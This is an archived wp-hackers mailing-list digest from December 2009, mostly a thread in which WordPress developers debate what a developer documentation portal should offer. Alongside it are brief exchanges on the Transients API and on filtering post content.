Message-ID: <77b239a00912150947v45831114gabe940d2a19cece7@mail.gmail.com>

Well, that was kinda my point.

On Tue, Dec 15, 2009 at 12:27 PM, Eric Marden <wp at xentek.net> wrote:

> On Dec 14, 2009, at 5:51 PM, Thomas Belknap wrote:
>
>  The CakePHP site has the Bakery, which seems - to the extent that I've
>> visited it, which is perhaps not a lot - decently active.
>>
>
>
> It also suggest many techniques that are out of date, plain wrong, or
> solutions that break with many of the CakePHP conventions. I don't trust the
> bakery (even though I want to), and instead use a combination of the
> 'Cookbook' and phpdocs.
>
> This is not a good example of a developer portal, in structure or
> substance, in my opinion.
>
>
> - Eric Marden
> __________________________________
> http://xentek.net/code/wordpress/
> tw: @xentek
>
>
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From ncrice at gmail.com  Tue Dec 15 17:51:35 2009
From: ncrice at gmail.com (Nathan Rice)
Date: Tue, 15 Dec 2009 12:51:35 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <5B1D9D9A-32C3-4405-9887-2CDFB95C6879@xentek.net>
References: <4B22AD95.8040401@mullenweg.com>
	<161617690912141243i14dd4938se8dad14d26e183df@mail.gmail.com>
	<0b0031952830acaf6707e955a4aec383@laurel.joyent.us>
	<862d087f0912141448y54cb959ap81e62e58af44cf06@mail.gmail.com>
	<4B26C893.8090308@mullenweg.com>
	<862d087f0912141541i4b484231jb1185cc499053e66@mail.gmail.com>
	<5B1D9D9A-32C3-4405-9887-2CDFB95C6879@xentek.net>
Message-ID: <862d087f0912150951he3aa2a6he005812dd374b6fe@mail.gmail.com>

On Tue, Dec 15, 2009 at 12:29 PM, Eric Marden <wp at xentek.net> wrote:

>
> Voting won't solve anything. It will eventually be gamed, much like Digg
> did. If Digg can't solve that issue, we won't have a chance.
>
>
If we can't trust developers to write the tutorials/documentation (we can't,
see the Codex), and we can't trust them community to vote for the best
external tutorials/documentation (see your statement), then the only
solution left is to set up an arbitrary committee to either write all
documentation or police the external links.

And I really don't like the sound of that.

Nathan

From Ken at adcSTUDIO.com  Tue Dec 15 18:08:41 2009
From: Ken at adcSTUDIO.com (Ken Newman)
Date: Tue, 15 Dec 2009 13:08:41 -0500
Subject: [wp-hackers] WP_Object_Cache problem
In-Reply-To: <e1202cb10912131647j38a509dcob21c23f3f9fdad36@mail.gmail.com>
References: <008601ca7a80$f5dceee0$e196cca0$@com>	<161617690912110939o60a9a2c8h2a5094661424bcda@mail.gmail.com>
	<e1202cb10912131647j38a509dcob21c23f3f9fdad36@mail.gmail.com>
Message-ID: <4B27D0A9.1020901@adcSTUDIO.com>

Should this be added here? http://codex.wordpress.org/WordPress_API's

On 12/13/2009 7:47 PM, Jeremy Clarke wrote:
> On Fri, Dec 11, 2009 at 12:39 PM, Otto<otto at ottodestruct.com>  wrote:
>    
>> function get_transient($transient)
>> function set_transient($transient, $value, $expiration = 0)
>> function delete_transient($transient)
>>      
> Dude you just blew my mind. I can now drop my custom wp_options
> pseudocache system and also stop telling people they need to write
> their own. IMHO this is one of the most needed functions in wordpress,
> its too bad it was silently languishing for so long! I have slides to
> update!
>
> I haven't actually tried using them yet but I made a Codex article
> based on your description and looking at the source. Anyone with
> experience please take a look through and fix anything that's not
> right.
>
> http://codex.wordpress.org/Transients_API
>
>    


From alex at dunae.ca  Tue Dec 15 18:12:35 2009
From: alex at dunae.ca (Alex Dunae)
Date: Tue, 15 Dec 2009 10:12:35 -0800 (PST)
Subject: [wp-hackers] Developer portal
In-Reply-To: <op.u4s65yocr6yny2@toscho.de>
References: <4B22AD95.8040401@mullenweg.com> <op.u4s65yocr6yny2@toscho.de>
Message-ID: <9a6bf2b9-0528-4cd6-b486-c3c444c8afae@u1g2000pre.googlegroups.com>

On Dec 11, 9:07?pm, "Thomas Scholz" <i... at toscho.de> wrote:

> Something like the PHP Manual: Extended information for all functions and ?
> classes with examples and user notes. Oh, and feeds for everything. :)

+1 for something like the PHP manual.  I heard on the jQuery podcast
that their docs are going to be powered by WordPress in the near
future, allowing comments a la PHP.net.  Seems like a great idea for
the WP docs.

I'll also second the need for up-to-date information, maybe a "last
known working version" at the top of Codex articles so users can see
it hasn't been tested since 2.5.


From pete at jointforcestech.com  Tue Dec 15 18:16:23 2009
From: pete at jointforcestech.com (Pete Mall)
Date: Tue, 15 Dec 2009 10:16:23 -0800
Subject: [wp-hackers] Developer portal
In-Reply-To: <9a6bf2b9-0528-4cd6-b486-c3c444c8afae@u1g2000pre.googlegroups.com>
References: <4B22AD95.8040401@mullenweg.com> <op.u4s65yocr6yny2@toscho.de> 
	<9a6bf2b9-0528-4cd6-b486-c3c444c8afae@u1g2000pre.googlegroups.com>
Message-ID: <7f49e8010912151016v13909d8fv34b6a9093b567a12@mail.gmail.com>

I think the docs should be powered by WordPress. We can 'invite' people to
write tutorials for WordPress.org as 'guest authors/bloggers' with a nice
author's bio box on the page. This will address the point about personal
recognition and we'll be able to use the comments to improve the page.



On Tue, Dec 15, 2009 at 10:12 AM, Alex Dunae <alex at dunae.ca> wrote:

> On Dec 11, 9:07 pm, "Thomas Scholz" <i... at toscho.de> wrote:
>
> > Something like the PHP Manual: Extended information for all functions and
>
> > classes with examples and user notes. Oh, and feeds for everything. :)
>
> +1 for something like the PHP manual.  I heard on the jQuery podcast
> that their docs are going to be powered by WordPress in the near
> future, allowing comments a la PHP.net.  Seems like a great idea for
> the WP docs.
>
> I'll also second the need for up-to-date information, maybe a "last
> known working version" at the top of Codex articles so users can see
> it hasn't been tested since 2.5.
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From otto at ottodestruct.com  Tue Dec 15 18:27:16 2009
From: otto at ottodestruct.com (Otto)
Date: Tue, 15 Dec 2009 12:27:16 -0600
Subject: [wp-hackers] Developer portal
In-Reply-To: <7f49e8010912151016v13909d8fv34b6a9093b567a12@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com> <op.u4s65yocr6yny2@toscho.de> 
	<9a6bf2b9-0528-4cd6-b486-c3c444c8afae@u1g2000pre.googlegroups.com> 
	<7f49e8010912151016v13909d8fv34b6a9093b567a12@mail.gmail.com>
Message-ID: <161617690912151027h7d57215ma4233f932dc2cd47@mail.gmail.com>

On Tue, Dec 15, 2009 at 12:16 PM, Pete Mall <pete at jointforcestech.com> wrote:
> I think the docs should be powered by WordPress. We can 'invite' people to
> write tutorials for WordPress.org as 'guest authors/bloggers' with a nice
> author's bio box on the page. This will address the point about personal
> recognition and we'll be able to use the comments to improve the page.

No, "ownership" eliminates "collaboration".

-Otto

From ncrice at gmail.com  Tue Dec 15 18:30:50 2009
From: ncrice at gmail.com (Nathan Rice)
Date: Tue, 15 Dec 2009 13:30:50 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <161617690912151027h7d57215ma4233f932dc2cd47@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com> <op.u4s65yocr6yny2@toscho.de>
	<9a6bf2b9-0528-4cd6-b486-c3c444c8afae@u1g2000pre.googlegroups.com>
	<7f49e8010912151016v13909d8fv34b6a9093b567a12@mail.gmail.com>
	<161617690912151027h7d57215ma4233f932dc2cd47@mail.gmail.com>
Message-ID: <862d087f0912151030q3f27f02bmc3d4c875fbf84c7@mail.gmail.com>

On Tue, Dec 15, 2009 at 1:27 PM, Otto <otto at ottodestruct.com> wrote:

>
> No, "ownership" eliminates "collaboration".
>
> -Otto
>
>
I think that about sums up my opposition to the central repository of
documentation/tutorials. Brilliantly stated, Otto.

------------------
Nathan Rice
WordPress and Web Development
www.nathanrice.net | twitter.com/nathanrice

From pete at jointforcestech.com  Tue Dec 15 18:32:33 2009
From: pete at jointforcestech.com (Pete Mall)
Date: Tue, 15 Dec 2009 10:32:33 -0800
Subject: [wp-hackers] Developer portal
In-Reply-To: <862d087f0912151030q3f27f02bmc3d4c875fbf84c7@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com> <op.u4s65yocr6yny2@toscho.de> 
	<9a6bf2b9-0528-4cd6-b486-c3c444c8afae@u1g2000pre.googlegroups.com> 
	<7f49e8010912151016v13909d8fv34b6a9093b567a12@mail.gmail.com> 
	<161617690912151027h7d57215ma4233f932dc2cd47@mail.gmail.com> 
	<862d087f0912151030q3f27f02bmc3d4c875fbf84c7@mail.gmail.com>
Message-ID: <7f49e8010912151032g7fe56dfbi144cac0794262062@mail.gmail.com>

People don't want to contribute without recognition.
People can't be help accountable without ownership.
Any suggestions?

On Tue, Dec 15, 2009 at 10:30 AM, Nathan Rice <ncrice at gmail.com> wrote:

> On Tue, Dec 15, 2009 at 1:27 PM, Otto <otto at ottodestruct.com> wrote:
>
> >
> > No, "ownership" eliminates "collaboration".
> >
> > -Otto
> >
> >
> I think that about sums up my opposition to the central repository of
> documentation/tutorials. Brilliantly stated, Otto.
>
> ------------------
> Nathan Rice
> WordPress and Web Development
> www.nathanrice.net | twitter.com/nathanrice
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From m at mullenweg.com  Tue Dec 15 18:38:23 2009
From: m at mullenweg.com (Matt Mullenweg)
Date: Tue, 15 Dec 2009 10:38:23 -0800
Subject: [wp-hackers] Developer portal
In-Reply-To: <7f49e8010912151032g7fe56dfbi144cac0794262062@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com> <op.u4s65yocr6yny2@toscho.de>
	<9a6bf2b9-0528-4cd6-b486-c3c444c8afae@u1g2000pre.googlegroups.com>
	<7f49e8010912151016v13909d8fv34b6a9093b567a12@mail.gmail.com>
	<161617690912151027h7d57215ma4233f932dc2cd47@mail.gmail.com>
	<862d087f0912151030q3f27f02bmc3d4c875fbf84c7@mail.gmail.com>
	<7f49e8010912151032g7fe56dfbi144cac0794262062@mail.gmail.com>
Message-ID: <4B27D79F.3040803@mullenweg.com>

On 2009-12-15 10:32 AM, Pete Mall wrote:
> People don't want to contribute without recognition.
> People can't be help accountable without ownership.
> Any suggestions?

My original question wasn't "how do we get people to contribute to a 
documentation resource" which honestly I'm not worried about, it was 
"What do you wish you had when you first started developing for WordPress?"

Anyone else have any wishlist items that haven't been mentioned yet?

-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From beau at dentedreality.com.au  Tue Dec 15 18:41:22 2009
From: beau at dentedreality.com.au (Beau Lebens)
Date: Tue, 15 Dec 2009 15:41:22 -0300
Subject: [wp-hackers] Developer portal
In-Reply-To: <7f49e8010912151016v13909d8fv34b6a9093b567a12@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com> <op.u4s65yocr6yny2@toscho.de>
	<9a6bf2b9-0528-4cd6-b486-c3c444c8afae@u1g2000pre.googlegroups.com>
	<7f49e8010912151016v13909d8fv34b6a9093b567a12@mail.gmail.com>
Message-ID: <902424490912151041m205e8c45la8a9eb81bb024600@mail.gmail.com>

> I think the docs should be powered by WordPress. We can 'invite' people to
> write tutorials for WordPress.org as 'guest authors/bloggers' with a nice
> author's bio box on the page. This will address the point about personal
> recognition and we'll be able to use the comments to improve the page.

I agree with this (specifically powered by WordPress, of course!), and
I think there are some elements that could make this really cool.
Here's a more detailed braindump of some ideas, a lot of which is
covered in Codex or other places, but could use some consolidation:

- General introduction to hooks; this concept takes a bit of a mental
shift for a lot of people I find, but once you have the idea, and can
look for hooks, you're up and running
- Definitely some sort of broad flow chart or diagram or something
that tries to explain the way WordPress loads, some of the major
sections of code which are included and some of the core hooks which
are called (init, the content, etc)
- Pages (or Posts) for major concepts, specific functions, particular hooks, etc
- We could auto-generate/populate the documentation with stubs for all
known hooks etc, so that we have a starting point to work from.
- Comments enabled so that people can add information/show examples
etc (moderated, as per PHP.net). This allows people a lower barrier to
contributing *something* useful to this new resource, without having
to write a whole tutorial or something
- Invite people to write on there using their WP.org accounts, and
then their posts could be credited back to those profiles and could
help build their reputation. We could also include a bio box on each
"guest post" with a link back to their site, short bio, gravatar, etc.
If a post is significantly modified over time, I suggest we either add
more "bio blocks", or remove them (indicating this post is not the
work of a single person any more).
- I think both comments and larger tutorials/documentation need some
sort of moderation/editing most likely, so whoever is doing that
(community volunteers!) would be able to make judgements on when to
change a post over to being "community written" vs individually
written.
- Tag all Posts/Pages with the WP versions they apply to, so for
example if something applied to every version from 1.5 through 2.9, it
should be tagged with each major version number between those 2 (but
perhaps we only display <=2.9 or something?)
- I think a hook database would be very helpful, including a short
description of when/where the hooks are used, what the parameters they
are passed contain, etc
- Broader tutorials/subjects like "How do I modify the output of a
Post or Page" (covering the appropriate hooks, linking to details of
shortcodes etc) should have their own section. This could include
things like Working with Users, Shortcode API, HTTP API, Working with
Feeds/RSS, Custom Post Types, Database access, Postmeta, Commentmeta,
WP options, Dashboard widgets API, Widget API, Theme functions (loop,
author, post, comments, etc) )
- Obviously something detailing where and how to get more help:
Mailing lists, IRC, Forums
- Coding Standards
- Theme development stuff (theme hierarchy, major hooks/filters,
conditionals (is_tag() etc), the loop, custom queries, etc)
- Compatibility Considerations (dealing with PHP 4.3, what you can't do in core)
- How to make a patch (for core or otherwise)
- How to submit a bug report/feature request etc (on trac)
- Getting Started with SVN
- Data Validation and Security Gotchas
- How the Plugin/Theme directories work (readme.txt, stable tag/headers, etc)
- Guidelines for theme and plugin directories
- How to get your theme/plugin listed

Hopefully something in there is useful to this discussion :)

Beau

From otto at ottodestruct.com  Tue Dec 15 18:44:33 2009
From: otto at ottodestruct.com (Otto)
Date: Tue, 15 Dec 2009 12:44:33 -0600
Subject: [wp-hackers] Developer portal
In-Reply-To: <7f49e8010912151032g7fe56dfbi144cac0794262062@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com> <op.u4s65yocr6yny2@toscho.de> 
	<9a6bf2b9-0528-4cd6-b486-c3c444c8afae@u1g2000pre.googlegroups.com> 
	<7f49e8010912151016v13909d8fv34b6a9093b567a12@mail.gmail.com> 
	<161617690912151027h7d57215ma4233f932dc2cd47@mail.gmail.com> 
	<862d087f0912151030q3f27f02bmc3d4c875fbf84c7@mail.gmail.com> 
	<7f49e8010912151032g7fe56dfbi144cac0794262062@mail.gmail.com>
Message-ID: <161617690912151044q63a569e1y2149424c9ec9429f@mail.gmail.com>

> On Tue, Dec 15, 2009 at 10:30 AM, Nathan Rice <ncrice at gmail.com> wrote:
>> On Tue, Dec 15, 2009 at 1:27 PM, Otto <otto at ottodestruct.com> wrote:
>> > No, "ownership" eliminates "collaboration".
>> >
>> > -Otto
>> >
>> I think that about sums up my opposition to the central repository of
>> documentation/tutorials. Brilliantly stated, Otto.

Hmm... I'd use the same argument to argue *for* a central repository.

Having a centralized place where people can post tuts *and* edit
existing ones as well (think Wiki, not WP Revisions), would encourage
collaboration.

On Tue, Dec 15, 2009 at 12:32 PM, Pete Mall <pete at jointforcestech.com> wrote:
> People don't want to contribute without recognition.

Nonsense. Wikipedia has no attributions. WordPress has no
attributions. Many people are willing to edit things without
recognition. Much of my material have been yanked and stuck into the
codex in one form or another. Doesn't bother me any.

> People can't be help accountable without ownership.

Accountability is a matter of tracking changes, not necessarily a
matter of owning the material.

> Any suggestions?

Personally, I like the idea of a wiki. I dislike the codex in
particular, but wikis = good.


On Tue, Dec 15, 2009 at 12:38 PM, Matt Mullenweg <m at mullenweg.com> wrote:
> My original question wasn't "how do we get people to contribute to a
> documentation resource" which honestly I'm not worried about, it was "What
> do you wish you had when you first started developing for WordPress?"
>
> Anyone else have any wishlist items that haven't been mentioned yet?

- Tutorials for specific sections of obscure (and not-so-obscure) stuff.

- A much better way to search for plugins. Half the time I'd start
writing something only to find a plugin later to do that exact thing.

- Tips on building a development environment. I see lots of questions
in the forums that even a new PHP developer could find the answer to
simply by doing a recursive search of the WordPress source.

- Specifically for theme authors: A comprehensive list of
best-practices and must-haves for making their theme that is kept
up-to-date. Too often I see people saying that their theme isn't
widgets compatible, or not understanding how to do threaded comments.
A lot of WP features are dependent on theme support. Themers need to
know how to not only do this stuff, but to know that it's mostly
mandatory.

-Otto
Sent from Memphis, TN, United States

From scribu at gmail.com  Tue Dec 15 18:45:58 2009
From: scribu at gmail.com (scribu)
Date: Tue, 15 Dec 2009 20:45:58 +0200
Subject: [wp-hackers] newlines from rich text editor do not convert to
	paragraphs
In-Reply-To: <4B27B3DB.7040509@adcSTUDIO.com>
References: <9aa12a490912121039m76116b4ch5536269947c1a941@mail.gmail.com>
	<op.u4viywoaspxmuu@dd32>
	<9aa12a490912130338p4416e9eayeb5824097b8f6f01@mail.gmail.com>
	<op.u4vk6lrdspxmuu@dd32>
	<d7153760912130751h533bbad1p9c3405553a4585f5@mail.gmail.com>
	<4B25F1CE.9060805@laptoptips.ca>
	<9aa12a490912140349p41f18f1dg5d8c819bc3075a91@mail.gmail.com>
	<9aa12a490912140432h43248b76jf776906ff1f4471d@mail.gmail.com>
	<349fe48b0912140800m6bf7ca82r30d767c90cce66c0@mail.gmail.com>
	<4B27B3DB.7040509@adcSTUDIO.com>
Message-ID: <349fe48b0912151045i516383cam5ea881a66c82905c@mail.gmail.com>

On Tue, Dec 15, 2009 at 6:05 PM, Ken Newman <Ken at adcstudio.com> wrote:
>
> You can apply the filter yourself:
>>
>> $filtered_content = apply_filters('the_content', get_the_post_content());
>>
>>  Would it be considered good practice do this, say, in child theme's
> function file?


Yes, it doesn't matter where you're putting this code.


-- 
http://scribu.net

From Ken at adcSTUDIO.com  Tue Dec 15 18:46:29 2009
From: Ken at adcSTUDIO.com (Ken Newman)
Date: Tue, 15 Dec 2009 13:46:29 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <7f49e8010912151032g7fe56dfbi144cac0794262062@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com> <op.u4s65yocr6yny2@toscho.de>
	<9a6bf2b9-0528-4cd6-b486-c3c444c8afae@u1g2000pre.googlegroups.com>
	<7f49e8010912151016v13909d8fv34b6a9093b567a12@mail.gmail.com>
	<161617690912151027h7d57215ma4233f932dc2cd47@mail.gmail.com>
	<862d087f0912151030q3f27f02bmc3d4c875fbf84c7@mail.gmail.com>
	<7f49e8010912151032g7fe56dfbi144cac0794262062@mail.gmail.com>
Message-ID: <4B27D985.8080008@adcSTUDIO.com>

A lot of good idea's on this thread, I'd like to combine some:

   1. I use the codex primarily as a function reference, and to look up
      API documentation. I think the codex should pull the phpdoc stuff,
      the inline documentation, as *part* of that reference as it could
      be more current (if the inline stuff is kept up-to-date). I'm not
      at all sure of the technical difficulty of such integration, but
      I'm sure it would be valuable if done.
      (Also, as having a live update on a public facing documentation
      site, it might provide incentive to keep up on documentation ;) I
      feel that someone should be paid full time to keep up with this
      (I'm unqualified). Perhaps companies, who like Automattic, have
      built businesses on WordPress can contribute a full time employee.
      My company is trying to be successful enough to do just that.)
   2. As far as tutorials, if there is a submission process with a
      description, as a separate part of the reference, then the
      tutorial would be search-able to some extent, and the recognition
      and site traffic desires would be satisfied. Voting (or the gaming
      of), I believe, wouldn't be much of a problem with the community
      using/contributing to WordPress, and would certainly have much value.
   3. And finally, a commenting system for users who are not yet at a
      level to write documentation or tutorials on there own could still
      contribute with questions and input in general.


And there's my two cents, thanks

On 12/15/2009 1:32 PM, Pete Mall wrote:
> People don't want to contribute without recognition.
> People can't be help accountable without ownership.
> Any suggestions?
>
> On Tue, Dec 15, 2009 at 10:30 AM, Nathan Rice<ncrice at gmail.com>  wrote:
>
>    
>> On Tue, Dec 15, 2009 at 1:27 PM, Otto<otto at ottodestruct.com>  wrote:
>>
>>      
>>> No, "ownership" eliminates "collaboration".
>>>
>>> -Otto
>>>
>>>
>>>        
>> I think that about sums up my opposition to the central repository of
>> documentation/tutorials. Brilliantly stated, Otto.
>>
>> ------------------
>> Nathan Rice
>> WordPress and Web Development
>> www.nathanrice.net | twitter.com/nathanrice
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>>      
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>    


From chris at clwill.com  Tue Dec 15 18:53:42 2009
From: chris at clwill.com (Chris Williams)
Date: Tue, 15 Dec 2009 13:53:42 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <4B27D79F.3040803@mullenweg.com>
Message-ID: <C74D1B36.54CF8%chris@clwill.com>

I'm not sure if it has been mentioned here yet, but some kind advice/suggestions on how to set up your work environment.  For example:


 *   Software tools you need/might find useful: editor, debugger, svn client
 *   Testing machine layout: local test machine, staging/test machine, live site, and how to move between them
 *   Brower test options/techniques: how to get access to and/or test for ie, ff, handhelds, etc.
 *   Related web resources: php.net, the css-d list, this list, etc.

Some of this can/will be religious (editors, for example) but perhaps a list of commonly used choices, or even just "you need a code editor".

I spent an inordinate amount of time when I started getting all of this worked out.  Some help/advice/pointers would help.

Chris

________________________________
From: Matt Mullenweg <m at mullenweg.com>
Subject: Re: [wp-hackers] Developer portal

Anyone else have any wishlist items that haven't been mentioned yet?

From Ken at adcSTUDIO.com  Tue Dec 15 18:57:40 2009
From: Ken at adcSTUDIO.com (Ken Newman)
Date: Tue, 15 Dec 2009 13:57:40 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <4B27D985.8080008@adcSTUDIO.com>
References: <4B22AD95.8040401@mullenweg.com>
	<op.u4s65yocr6yny2@toscho.de>	<9a6bf2b9-0528-4cd6-b486-c3c444c8afae@u1g2000pre.googlegroups.com>	<7f49e8010912151016v13909d8fv34b6a9093b567a12@mail.gmail.com>	<161617690912151027h7d57215ma4233f932dc2cd47@mail.gmail.com>	<862d087f0912151030q3f27f02bmc3d4c875fbf84c7@mail.gmail.com>	<7f49e8010912151032g7fe56dfbi144cac0794262062@mail.gmail.com>
	<4B27D985.8080008@adcSTUDIO.com>
Message-ID: <4B27DC24.9010902@adcSTUDIO.com>

After reading Matt's message on adding stuff to the codex, perhaps these 
suggestions are better off on a separate site?

As a new developer (few months in) learning to work with WordPress, the 
greatest resource for me is the codex/documentation. I'd just love to 
see it even better!

A portal for me would be sectioning off of good resources and tutorials, 
both official and external, as well as news updates to keep current with 
all things wordpress (all of which exists, but not on a single page 
afaik ;) ). How such content is aggregated i guess is the question?

On 12/15/2009 1:46 PM, Ken Newman wrote:
> A lot of good idea's on this thread, I'd like to combine some:
>
>   1. I use the codex primarily as a function reference, and to look up
>      API documentation. I think the codex should pull the phpdoc stuff,
>      the inline documentation, as *part* of that reference as it could
>      be more current (if the inline stuff is kept up-to-date). I'm not
>      at all sure of the technical difficulty of such integration, but
>      I'm sure it would be valuable if done.
>      (Also, as having a live update on a public facing documentation
>      site, it might provide incentive to keep up on documentation ;) I
>      feel that someone should be paid full time to keep up with this
>      (I'm unqualified). Perhaps companies, who like Automattic, have
>      built businesses on WordPress can contribute a full time employee.
>      My company is trying to be successful enough to do just that.)
>   2. As far as tutorials, if there is a submission process with a
>      description, as a separate part of the reference, then the
>      tutorial would be search-able to some extent, and the recognition
>      and site traffic desires would be satisfied. Voting (or the gaming
>      of), I believe, wouldn't be much of a problem with the community
>      using/contributing to WordPress, and would certainly have much 
> value.
>   3. And finally, a commenting system for users who are not yet at a
>      level to write documentation or tutorials on there own could still
>      contribute with questions and input in general.
>
>
> And there's my two cents, thanks
>
> On 12/15/2009 1:32 PM, Pete Mall wrote:
>> People don't want to contribute without recognition.
>> People can't be help accountable without ownership.
>> Any suggestions?
>>
>> On Tue, Dec 15, 2009 at 10:30 AM, Nathan Rice<ncrice at gmail.com>  wrote:
>>
>>> On Tue, Dec 15, 2009 at 1:27 PM, Otto<otto at ottodestruct.com>  wrote:
>>>
>>>> No, "ownership" eliminates "collaboration".
>>>>
>>>> -Otto
>>>>
>>>>
>>> I think that about sums up my opposition to the central repository of
>>> documentation/tutorials. Brilliantly stated, Otto.
>>>
>>> ------------------
>>> Nathan Rice
>>> WordPress and Web Development
>>> www.nathanrice.net | twitter.com/nathanrice
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From if.website at gmail.com  Tue Dec 15 18:58:08 2009
From: if.website at gmail.com (Austin Matzko)
Date: Tue, 15 Dec 2009 12:58:08 -0600
Subject: [wp-hackers] Developer portal
In-Reply-To: <4B22AD95.8040401@mullenweg.com>
References: <4B22AD95.8040401@mullenweg.com>
Message-ID: <674b4a3b0912151058rf9205a4lcf6b46fb84ae5705@mail.gmail.com>

On Fri, Dec 11, 2009 at 2:37 PM, Matt Mullenweg <m at mullenweg.com> wrote:
> If there were to be a developer portal for WordPress, someplace where if
> you're first getting started with hacking on WP, building plugins, creating
> themes, you could go and it'd have all the best resources in one place, what
> resources do you think would be important to have there?
>
> What do you wish you had when you first started developing for WordPress?

I don't remember specifically, but I do know what I look for every
time I start to develop for or customize a new application of any
sort:
 * Documentation
 * Tutorials
 * An IRC channel where I can ask noob questions
 * Open-sourced code to grep through

Thankfully WordPress already has all of those, even if not in the same
place (I'm not really sure what it would mean to have them in the same
place).

From dragonfly at dragonflyeye.net  Tue Dec 15 19:00:26 2009
From: dragonfly at dragonflyeye.net (Thomas Belknap)
Date: Tue, 15 Dec 2009 14:00:26 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <C74D1B36.54CF8%chris@clwill.com>
References: <4B27D79F.3040803@mullenweg.com> <C74D1B36.54CF8%chris@clwill.com>
Message-ID: <77b239a00912151100m501fa733w369921a7a18d9a68@mail.gmail.com>

As long as we're just "wish-listing," I'd vote for some sort of interactive
function relationships thing. What I mean is maybe something like the old
Digg relationships Flash thing or http://www.pearltrees.com/, where we can
see all the functions which either call or are called by a given function.

Ya know, as long as we're wish-listing....

From ncrice at gmail.com  Tue Dec 15 19:36:35 2009
From: ncrice at gmail.com (Nathan Rice)
Date: Tue, 15 Dec 2009 14:36:35 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <161617690912151044q63a569e1y2149424c9ec9429f@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com> <op.u4s65yocr6yny2@toscho.de>
	<9a6bf2b9-0528-4cd6-b486-c3c444c8afae@u1g2000pre.googlegroups.com>
	<7f49e8010912151016v13909d8fv34b6a9093b567a12@mail.gmail.com>
	<161617690912151027h7d57215ma4233f932dc2cd47@mail.gmail.com>
	<862d087f0912151030q3f27f02bmc3d4c875fbf84c7@mail.gmail.com>
	<7f49e8010912151032g7fe56dfbi144cac0794262062@mail.gmail.com>
	<161617690912151044q63a569e1y2149424c9ec9429f@mail.gmail.com>
Message-ID: <862d087f0912151136r436bc7dfu93281ec810a659c8@mail.gmail.com>

On Tue, Dec 15, 2009 at 1:44 PM, Otto <otto at ottodestruct.com> wrote:

>
> >> I think that about sums up my opposition to the central repository of
> >> documentation/tutorials. Brilliantly stated, Otto.
>
> Hmm... I'd use the same argument to argue *for* a central repository.
>
> Having a centralized place where people can post tuts *and* edit
> existing ones as well (think Wiki, not WP Revisions), would encourage
> collaboration.
>

It's already there.
http://codex.wordpress.org/Main_Page

Isn't that the point of this discussion, though? That the Codex is generally
inferior to just doing a google search for a tutorial on someone's blog?

For instance, this:
http://ottodestruct.com/blog/2009/wordpress-settings-api-tutorial/
seems far more useful to me than this:
http://codex.wordpress.org/Settings_API


>
> > People don't want to contribute without recognition.
>
> Nonsense. Wikipedia has no attributions. WordPress has no
> attributions. Many people are willing to edit things without
> recognition. Much of my material have been yanked and stuck into the
> codex in one form or another. Doesn't bother me any.
>

If that's the case, then I propose locating those individuals who are ok
with their material "being yanked and stuck into the codex" and have them be
the volunteer producers of Codex content.

Historically, though, these people have either been too few in number, or
too busy to update the Codex themselves. Whereas the financial (or
psychological) benefit of traffic has historically been a good motivator for
creating content on one's own blog, and therefore there is no shortage of
information accessible via a simple google search.

Making that material accessible via the Codex seems like a good step to me.

However, that's obviously not going to happen, so I'll shut up and try to
provide constructive feedback on the options that actually have a chance of
being implemented :-)

From ncrice at gmail.com  Tue Dec 15 19:39:45 2009
From: ncrice at gmail.com (Nathan Rice)
Date: Tue, 15 Dec 2009 14:39:45 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <4B27D79F.3040803@mullenweg.com>
References: <4B22AD95.8040401@mullenweg.com> <op.u4s65yocr6yny2@toscho.de>
	<9a6bf2b9-0528-4cd6-b486-c3c444c8afae@u1g2000pre.googlegroups.com>
	<7f49e8010912151016v13909d8fv34b6a9093b567a12@mail.gmail.com>
	<161617690912151027h7d57215ma4233f932dc2cd47@mail.gmail.com>
	<862d087f0912151030q3f27f02bmc3d4c875fbf84c7@mail.gmail.com>
	<7f49e8010912151032g7fe56dfbi144cac0794262062@mail.gmail.com>
	<4B27D79F.3040803@mullenweg.com>
Message-ID: <862d087f0912151139o8ac6913y202e35b567b3ddc1@mail.gmail.com>

On Tue, Dec 15, 2009 at 1:38 PM, Matt Mullenweg <m at mullenweg.com> wrote:

> On 2009-12-15 10:32 AM, Pete Mall wrote:
>
>> People don't want to contribute without recognition.
>> People can't be help accountable without ownership.
>> Any suggestions?
>>
>
> My original question wasn't "how do we get people to contribute to a
> documentation resource" which honestly I'm not worried about, it was "What
> do you wish you had when you first started developing for WordPress?"
>

Fair enough.


>
> Anyone else have any wishlist items that haven't been mentioned yet?
>

Honestly, I wish I had known about http://phpxref.com/xref/wordpress/ when I
first started developing. That's my first stop when I want to know something
